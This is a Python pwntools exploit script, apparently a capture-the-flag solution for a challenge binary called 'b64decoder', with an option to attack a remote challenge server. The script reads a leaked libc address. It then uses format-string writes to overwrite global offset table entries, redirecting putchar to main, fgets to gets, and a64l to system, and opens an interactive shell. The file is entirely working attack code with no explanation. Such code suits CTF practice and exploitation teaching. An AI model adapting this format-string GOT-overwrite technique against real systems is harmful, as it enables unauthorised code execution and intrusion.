from pwn import *

e = ELF("./b64decoder")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("challenges.tamuctf.com", 2783)
else:
  p = process(e.path)

p.recvuntil("Powered by ")
p.recvuntil("0x")
leak = int(p.recvuntil(")", drop=True), 16) - libc.symbols["a64l"]

print(hex(leak))


p.sendlineafter("name!",
  (
    "%" + str(e.symbols["main"] % 0x10000) + "x" + "%77$hn"
  ).ljust(0x18, "\x00")
  + p32(e.got["putchar"])
)

p.sendlineafter("name!",
  (
    "%" + str((leak + libc.symbols["gets"]) % 0x10000) + "x" + "%77$hn"
  ).ljust(0x18, "\x00")
  + p32(e.got["fgets"])
)

p.sendlineafter("name!",
  (
    "%" + str((leak + libc.symbols["system"]) % 0x10000) + "x" + "%77$hn"
  ).ljust(0x18, "\x00")
  + p32(e.got["a64l"])
)

p.sendlineafter("name!",
  (
    "%" + str(0x804938c % 0x10000) + "x" + "%77$hn"
  ).ljust(0x18, "\x00")
  + p32(e.got["putchar"])
)




p.interactive()
